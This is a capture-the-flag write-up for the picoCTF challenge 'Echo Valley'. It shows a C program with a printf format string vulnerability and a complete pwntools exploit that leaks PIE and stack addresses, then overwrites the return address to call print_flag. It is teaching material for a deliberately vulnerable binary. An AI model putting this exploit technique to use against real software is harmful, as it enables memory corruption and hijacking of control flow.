---
title: "Echo Valley"
categories: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flags: picoCTF{REDACTED}
---
> The echo valley is a simple function that echoes back whatever you say to it.
> But how do you make it respond with something more interesting, like a flag?

by Shuailin Pan (LeConjuror)

---

<details>
<summary>Hint 1</summary>

Ever heard of a format string attack?
</details>

---

The challenge provides a binary `valley` and a remote server to connect to. The binary is a simple program that reads input from the user and prints it back to the user. The binary also contains a function `print_flag` that reads the flag from a file and prints it to the user.

```c
void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}
```

The goal of the challenge is to print the flag to the user. The `print_flag` function is not called in the binary, so we need to find a way to call it. The binary is vulnerable to a format string attack. We can use the format string vulnerability to overwrite some memory to call the `print_flag` function. The binary is compiled with the `FULL RELRO` option, so we cannot overwrite the GOT table. We can use another technique to call the `print_flag` function. We can overwrite the return address of the `echo_valley` function to call the `print_flag` function.

The binary is compiled with the `PIE` option, so the base address of the binary is randomized. We can leak the base address of the binary by using the format string vulnerability. We can also leak the stack address by using the format string vulnerability. We can calculate the return address of the `echo_valley` function by adding 8 to the leaked stack address. We can calculate the offset of the format string vulnerability by using the `FmtStr` class from the `pwntools` library. We can then use the `fmtstr_payload` function from the `pwntools` library to create a payload to overwrite the return address of the `echo_valley` function to call the `print_flag` function.

```py
from pwn import *

binary = './valley'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('shape-facility.picoctf.net', 65453)

def exec_fmt(payload):
    p = process(binary)
    p.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')
    p.sendline(payload)
    p.recvuntil(b'You heard in the distance: ')
    recv = p.recv()
    p.close()
    return recv

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

r.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')

r.sendline(b'%21$p.%20$p')
r.recvuntil(b'You heard in the distance: ')
leak = r.recvline().strip().split(b'.')
main_address_ = int(leak[0], 16)
stack_address = (int(leak[1], 16))
log.info(f'main_address_: {hex(main_address_)}')

base_address = main_address_ - (0x555555555413 - 0x555555554000)
log.info(f'base_address: {hex(base_address)}')

ret_address = stack_address + 8

payload = fmtstr_payload(offset, { ret_address: base_address + e.sym['print_flag'] }, write_size='short')
r.sendline(payload)
r.sendline(b'exit')

r.interactive()
```
